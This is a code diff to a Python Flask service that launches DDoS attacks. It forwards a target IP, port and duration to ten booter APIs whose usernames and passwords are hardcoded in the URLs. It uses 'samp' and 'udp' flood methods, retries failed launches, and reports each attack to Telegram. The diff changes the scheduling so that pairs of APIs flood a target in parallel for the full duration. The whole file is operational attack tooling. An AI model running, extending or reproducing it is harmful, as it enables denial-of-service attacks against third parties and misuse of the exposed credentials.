@@ -4,7 +4,6 @@ import requests
 import logging
 import time
 import threading
-import random
 
 app = Flask(__name__)
 
@@ -20,30 +19,37 @@ def send_telegram_message(message):
     for chat_id in CHAT_IDS:
         if chat_id:
             try:
-                requests.post(TELEGRAM_API_URL, data={
-                    'chat_id': chat_id, 
-                    'text': message, 
-                    'parse_mode': 'HTML'
-                }, timeout=5)
+                requests.post(TELEGRAM_API_URL, data={'chat_id': chat_id, 'text': message, 'parse_mode': 'HTML'}, timeout=5)
             except:
                 pass
 
 # ==================== TARGET APIS ====================
 TARGET_APIS = [
-    # 5 Old APIs (Will use 'samp' method)
-    {"id": 1, "name": "OLD_API_1", "type": "old", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False},
-    {"id": 2, "name": "OLD_API_2", "type": "old", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False},
-    {"id": 3, "name": "OLD_API_3", "type": "old", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False},
-    {"id": 4, "name": "OLD_API_4", "type": "old", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False},
-    {"id": 5, "name": "OLD_API_5", "type": "old", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False},
+    {"id": 1, "name": "OLD_API_1", "type": "old", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False, "busy_until": 0},
+    {"id": 2, "name": "OLD_API_2", "type": "old", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False, "busy_until": 0},
+    {"id": 3, "name": "OLD_API_3", "type": "old", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False, "busy_until": 0},
+    {"id": 4, "name": "OLD_API_4", "type": "old", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False, "busy_until": 0},
+    {"id": 5, "name": "OLD_API_5", "type": "old", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False, "busy_until": 0},
     
-    # 5 New APIs (Will use 'udp' method)
-    {"id": 6,  "name": "NEW_API_1", "type": "new", "url": "http://38.87.116.24/api/attack?user=ytx&password=H712@11fal&method={method}&target={ip}&dport={port}&time={time}&len={len}", "busy": False},
-    {"id": 7,  "name": "NEW_API_2", "type": "new", "url": "http://38.87.116.24/api/attack?user=ytx&password=H712@11fal&method={method}&target={ip}&dport={port}&time={time}&len={len}", "busy": False},
-    {"id": 8,  "name": "NEW_API_3", "type": "new", "url": "http://38.87.116.24/api/attack?user=ytx&password=H712@11fal&method={method}&target={ip}&dport={port}&time={time}&len={len}", "busy": False},
-    {"id": 9,  "name": "NEW_API_4", "type": "new", "url": "http://38.87.116.24/api/attack?user=ytx&password=H712@11fal&method={method}&target={ip}&dport={port}&time={time}&len={len}", "busy": False},
-    {"id": 10, "name": "NEW_API_5", "type": "new", "url": "http://38.87.116.24/api/attack?user=ytx&password=H712@11fal&method={method}&target={ip}&dport={port}&time={time}&len={len}", "busy": False},
+    {"id": 6,  "name": "NEW_API_1", "type": "new", "url": "http://38.87.116.24/api/attack?user=ytx&password=H712@11fal&method={method}&target={ip}&dport={port}&time={time}&len={len}", "busy": False, "busy_until": 0},
+    {"id": 7,  "name": "NEW_API_2", "type": "new", "url": "http://38.87.116.24/api/attack?user=ytx&password=H712@11fal&method={method}&target={ip}&dport={port}&time={time}&len={len}", "busy": False, "busy_until": 0},
+    {"id": 8,  "name": "NEW_API_3", "type": "new", "url": "http://38.87.116.24/api/attack?user=ytx&password=H712@11fal&method={method}&target={ip}&dport={port}&time={time}&len={len}", "busy": False, "busy_until": 0},
+    {"id": 9,  "name": "NEW_API_4", "type": "new", "url": "http://38.87.116.24/api/attack?user=ytx&password=H712@11fal&method={method}&target={ip}&dport={port}&time={time}&len={len}", "busy": False, "busy_until": 0},
+    {"id": 10, "name": "NEW_API_5", "type": "new", "url": "http://38.87.116.24/api/attack?user=ytx&password=H712@11fal&method={method}&target={ip}&dport={port}&time={time}&len={len}", "busy": False, "busy_until": 0},
 ]
+
+def is_api_available(api):
+    if api['busy'] and time.time() < api.get('busy_until', 0):
+        return False
+    return True
+
+def mark_busy(api, duration):
+    api['busy'] = True
+    api['busy_until'] = time.time() + duration + 10  # Extra buffer
+
+def mark_free(api):
+    api['busy'] = False
+    api['busy_until'] = 0
 
 def get_response_summary(response, response_time):
     summary = f"Status: {response.status_code} | Time: {response_time}ms\n"
@@ -64,32 +70,19 @@ def is_attack_successful(response):
         data = response.json()
         error = data.get('error')
         message = str(data.get('message', '')).lower()
-        
-        if error is False or 'launched' in message or 'success' in message or 'started' in message:
+        if error is False or any(word in message for word in ['launched', 'success', 'started', 'sent', 'attack']):
             return True
-        if error is True or any(kw in message for kw in ['slots full', 'busy', 'full', 'wait', 'limit', 'cooldown', 'fail']):
+        if error is True or any(word in message for word in ['slots full', 'busy', 'full', 'wait', 'limit', 'cooldown', 'fail']):
             return False
     except:
         pass
-    
-    if response.status_code == 200:
-        text = response.text.strip().lower()
-        if any(kw in text for kw in ['slots full', 'busy', 'wait', 'full', 'limit']):
-            return False
-        return True
-    return False
+    return response.status_code == 200
 
 def send_attack_to_api(api, ip, port, duration, packet_len=512):
-    """Send attack with retry logic + Fixed Method per API Type"""
-    # Force method based on API type
-    if api["type"] == "old":
-        method = "samp"
-    else:
-        method = "udp"
-    
+    method = "samp" if api["type"] == "old" else "udp"
     max_retries = 8
     retry_count = 0
-    
+
     while retry_count < max_retries:
         attempt = retry_count + 1
         start_time = time.time()
@@ -103,82 +96,66 @@ def send_attack_to_api(api, ip, port, duration, packet_len=512):
             response = requests.get(target_url, timeout=25)
             response_time = int((time.time() - start_time) * 1000)
             
-            response_summary = get_response_summary(response, response_time)
-
-            telegram_msg = f"""
-🔵 <b>ATTACK ATTEMPT #{attempt}/{max_retries}</b>
-├ API: {api['name']} ({api['type'].upper()})
-├ Method: {method.upper()} 
+            send_telegram_message(f"""
+🔵 <b>ATTEMPT #{attempt}/{max_retries}</b> | {api['name']}
+├ Method: {method.upper()}
 ├ Target: {ip}:{port}
 ├ Duration: {duration}s
-├ Len: {packet_len if api['type']=='new' else 'N/A'}
 ├ Status: {response.status_code}
-├ Response Time: {response_time}ms
 └ Response:
-{response_summary}
-"""
-            send_telegram_message(telegram_msg)
+{get_response_summary(response, response_time)}
+""")
 
             if is_attack_successful(response):
                 send_telegram_message(f"""
-✅ <b>ATTACK SUCCESSFULLY STARTED</b>
-├ API: {api['name']}
-├ Method: {method.upper()}
-├ Target: {ip}:{port}
-├ Duration: {duration}s
-├ Attempt: {attempt}/{max_retries}
+✅ <b>ATTACK STARTED SUCCESSFULLY</b> | {api['name']}
+├ Method: {method.upper()} | {ip}:{port} | {duration}s
 """)
                 return True
-            
-            else:
-                retry_count += 1
-                if retry_count < max_retries:
-                    time.sleep(2)
+
+            retry_count += 1
+            if retry_count < max_retries:
+                time.sleep(2)
 
         except Exception as e:
             retry_count += 1
-            response_time = int((time.time() - start_time) * 1000)
-            send_telegram_message(f"""
-⚠️ <b>REQUEST FAILED</b> (Attempt {attempt}/{max_retries})
-├ API: {api['name']}
-├ Method: {method.upper()}
-├ Error: {str(e)[:180]}
-├ Time: {response_time}ms
-""")
+            send_telegram_message(f"⚠️ Error on {api['name']} (Attempt {attempt}): {str(e)[:150]}")
             if retry_count < max_retries:
                 time.sleep(min(2 ** retry_count, 10))
 
-    send_telegram_message(f"""
-💀 <b>ALL RETRIES FAILED</b> on {api['name']}
-├ Method: {method.upper()}
-├ Target: {ip}:{port}
-""")
+    send_telegram_message(f"💀 All retries failed on {api['name']}")
     return False
 
-def execute_attack(selected_apis, ip, port, total_time, packet_len=512):
-    threads = []
+def execute_attack(old_api, new_api, ip, port, total_time, packet_len=512):
+    selected = [old_api, new_api]
     
-    for api in selected_apis:
-        api['busy'] = True
-        method = "samp" if api['type'] == "old" else "udp"
-        send_telegram_message(f"🚀 QUEUED → {api['name']} | Method: {method.upper()} | {ip}:{port} ({total_time}s)")
+    # Mark both busy immediately
+    for api in selected:
+        mark_busy(api, total_time)
+        send_telegram_message(f"🚀 LAUNCHING → {api['name']} | {ip}:{port} ({total_time}s)")
 
-    for api in selected_apis:
-        t = threading.Thread(
-            target=send_attack_to_api,
-            args=(api, ip, port, total_time, packet_len),
-            daemon=True
-        )
+    # Start both attacks in parallel
+    threads = []
+    for api in selected:
+        t = threading.Thread(target=send_attack_to_api, 
+                           args=(api, ip, port, total_time, packet_len), 
+                           daemon=True)
         threads.append(t)
         t.start()
 
     for t in threads:
         t.join()
 
-    for api in selected_apis:
-        api['busy'] = False
+    # Wait full duration even if one failed
+    send_telegram_message(f"⏳ Waiting full duration ({total_time}s) before releasing both APIs...")
+    time.sleep(total_time)
 
-    send_telegram_message(f"✅ Attack Cycle Completed → {ip}:{port} ({total_time}s)")
+    # Free both APIs
+    for api in selected:
+        mark_free(api)
+        send_telegram_message(f"✅ SLOT RELEASED → {api['name']} is now available")
+
+    send_telegram_message(f"✅ Pair Attack Completed → {ip}:{port} ({total_time}s)")
 
 @app.route('/attack/start', methods=['GET'])
 def start_attack():
@@ -199,46 +176,42 @@ def start_attack():
     except:
         return jsonify({'error': 'Invalid parameters'}), 400
 
-    # Select 1 Old + 1 New API
-    old_apis = [api for api in TARGET_APIS if api['type'] == 'old' and not api['busy']]
-    new_apis = [api for api in TARGET_APIS if api['type'] == 'new' and not api['busy']]
+    # Find first available paired APIs
+    for i in range(5):
+        old_api = TARGET_APIS[i]
+        new_api = TARGET_APIS[i + 5]
+        
+        if is_api_available(old_api) and is_api_available(new_api):
+            threading.Thread(
+                target=execute_attack,
+                args=(old_api, new_api, ip, port, total_time, packet_len),
+                daemon=True
+            ).start()
+            
+            return jsonify({
+                'success': True,
+                'pair': f"{old_api['name']} + {new_api['name']}",
+                'target': f'{ip}:{port}',
+                'time': total_time,
+                'status': 'Both APIs running in parallel'
+            })
 
-    selected = []
-    if old_apis:
-        selected.append(random.choice(old_apis))
-    if new_apis:
-        selected.append(random.choice(new_apis))
-
-    if not selected:
-        return jsonify({'error': 'No APIs available right now'}), 503
-
-    threading.Thread(
-        target=execute_attack,
-        args=(selected, ip, port, total_time, packet_len),
-        daemon=True
-    ).start()
-
-    return jsonify({
-        'success': True,
-        'apis_used': [a['name'] for a in selected],
-        'target': f'{ip}:{port}',
-        'time': total_time,
-        'note': 'Old API = samp | New API = udp'
-    })
+    return jsonify({'error': 'All API pairs are currently busy'}), 503
 
 @app.route('/status', methods=['GET'])
 def status():
     return jsonify({
-        'free_old': [api['name'] for api in TARGET_APIS if api['type'] == 'old' and not api['busy']],
-        'free_new': [api['name'] for api in TARGET_APIS if api['type'] == 'new' and not api['busy']],
-        'busy': [api['name'] for api in TARGET_APIS if api['busy']]
+        'free_pairs': [f"Pair {i+1}" for i in range(5) 
+                      if is_api_available(TARGET_APIS[i]) and is_api_available(TARGET_APIS[i+5])],
+        'busy_apis': [api['name'] for api in TARGET_APIS if api['busy']]
     })
 
 if __name__ == '__main__':
-    print("="*90)
-    print("🚀 MULTI-API SYSTEM READY")
-    print("→ Old APIs  : Always use 'samp'")
-    print("→ New APIs  : Always use 'udp'")
+    print("="*100)
+    print("🚀 PAIRED API SYSTEM ACTIVE")
+    print("Pairing: 1-6, 2-7, 3-8, 4-9, 5-10")
+    print("→ If one API fails, the other still runs full time")
+    print("→ Both slots released only after full duration")
     print("Usage: /attack/start?ip=1.2.3.4&port=80&time=300&len=1024")
-    print("="*90)
+    print("="*100)
     app.run(host='0.0.0.0', port=8080, threaded=True)
